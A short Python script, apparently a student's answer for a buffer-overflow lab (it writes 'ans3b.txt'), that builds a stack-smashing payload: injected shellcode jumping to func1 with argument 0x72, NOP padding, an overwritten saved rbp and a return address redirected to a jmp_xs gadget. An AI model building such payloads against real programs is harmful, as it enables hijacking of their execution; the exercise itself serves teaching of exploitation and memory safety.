import struct

jmp_xs = 0x401334      # jmp_xs()
func1  = 0x401216      # func1(int)

# shellcode:
#   mov edi, 0x72
#   mov rax, func1
#   jmp rax
shellcode = (
    b"\xBF\x72\x00\x00\x00"                  # mov edi, 0x72
    + b"\x48\xB8" + struct.pack("<Q", func1) # mov rax, func1
    + b"\xFF\xE0"                            # jmp rax
)

payload  = shellcode
payload += b"\x90" * (0x20 - len(payload))   # fill buf (32 bytes)

payload += b"BBBBBBBB"                       # overwrite saved rbp
payload += struct.pack("<Q", jmp_xs)         # overwrite ret -> jmp_xs

payload = payload.ljust(0x40, b"\x90")       # memcpy copies 0x40 bytes

open("ans3b.txt", "wb").write(payload)
print("written ans3b.txt, len =", len(payload))
